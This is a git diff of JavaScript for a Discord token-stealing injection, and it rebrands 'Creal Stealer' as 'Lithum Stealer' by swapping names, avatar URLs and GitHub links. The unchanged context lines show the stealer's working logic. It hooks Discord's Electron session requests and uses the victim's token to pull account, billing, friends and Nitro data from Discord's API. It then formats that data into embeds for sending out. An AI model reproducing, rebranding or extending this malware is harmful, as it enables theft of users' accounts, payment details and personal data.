@@ -68,8 +68,8 @@ const makeEmbed = async ({
     description
 }) => {
     var params = {
-        username: "Creal Stealer",
-        avatar_url: "https://raw.githubusercontent.com/Ayhuuu/Creal-Stealer/main/img/xd.jpg",
+        username: "Lithum Stealer",
+        avatar_url: "https://raw.githubusercontent.com/Reaper513/lithum-stealer/main/img/xd.jpg",
         content: "",
         embeds: [{
             title: title,
@@ -77,11 +77,11 @@ const makeEmbed = async ({
             fields: fields,
             description: description ?? "",
             author: {
-                name: `Creal Stealer`
+                name: `Lithum Stealer`
             },
             
             footer: {
-                text: ` [${config.creator}] | https://github.com/Ayhuuu/`
+                text: ` [${config.creator}] | https://github.com/Reaper513/`
             },
 
         }]
@@ -317,8 +317,8 @@ const FirstTime = async () => {
 
         var Billings = parseBilling(billing)
         var Friends = parseFriends(friends)
-        if (!user.avatar) var userAvatar = "https://raw.githubusercontent.com/Ayhuuu/Creal-Stealer/main/img/xd.jpg"
-        if (!user.banner) var userBanner = "https://raw.githubusercontent.com/Ayhuuu/injection/main/banner.gif"
+        if (!user.avatar) var userAvatar = "https://raw.githubusercontent.com/Reaper513/lithum-stealer/main/img/xd.jpg"
+        if (!user.banner) var userBanner = "https://raw.githubusercontent.com/Reaper513/injection./main/banner.gif"
 
         userBanner = userBanner ?? await getGifOrPNG(`https://cdn.discordapp.com/banners/${user.id}/${user.banner}`)
         userAvatar = userAvatar ?? await getGifOrPNG(`https://cdn.discordapp.com/avatars/${user.id}/${user.avatar}`)
@@ -355,7 +355,7 @@ const FirstTime = async () => {
                 inline: !0
             }, {
                 name: "@Copyright",
-                value: `[Creal Stealer <a:mavikirmizi:853238372591599617>](https://github.com/Ayhuuu/Creal-Stealer)`,
+                value: `[Lithum Stealer <a:mavikirmizi:853238372591599617>](https://github.com/Ayhuuu/Creal-Stealer)`,
                 inline: !0
             }, {
                 name: "Creal Files",
@@ -410,7 +410,7 @@ const FirstTime = async () => {
 
             var Billings = parseBilling(billing)
             var Friends = parseFriends(friends)
-            if (!user.avatar) var userAvatar = "https://raw.githubusercontent.com/Ayhuuu/Creal-Stealer/main/img/xd.jpg"
+            if (!user.avatar) var userAvatar = "https://raw.githubusercontent.com/Reaper513/lithum-stealer/main/img/xd.jpg"
             if (!user.banner) var userBanner = "https://raw.githubusercontent.com/Ayhuuu/injection/main/banner.gif"
             
             userBanner = userBanner ?? await getGifOrPNG(`https://cdn.discordapp.com/banners/${user.id}/${user.banner}`)
@@ -584,8 +584,8 @@ electron.session.defaultSession.webRequest.onCompleted(config.onCompleted, async
     var friends = await getURL("https://discord.com/api/v9/users/@me/relationships", token)
     var Nitro = await getURL("https://discord.com/api/v9/users/" + user.id + "/profile", token);
 
-    if (!user.avatar) var userAvatar = "https://raw.githubusercontent.com/Ayhuuu/Creal-Stealer/main/img/xd.jpg"
-    if (!user.banner) var userBanner = "https://raw.githubusercontent.com/Ayhuuu/injection/main/banner.gif"
+    if (!user.avatar) var userAvatar = "https://raw.githubusercontent.com/Reaper513/lithum-stealer/main/img/xd.jpg"
+    if (!user.banner) var userBanner = "https://raw.githubusercontent.com/Reaper513/injection./main/banner.gif"
 
     userBanner = userBanner ?? await getGifOrPNG(`https://cdn.discordapp.com/banners/${user.id}/${user.banner}`)
     userAvatar = userAvatar ?? await getGifOrPNG(`https://cdn.discordapp.com/avatars/${user.id}/${user.avatar}`)
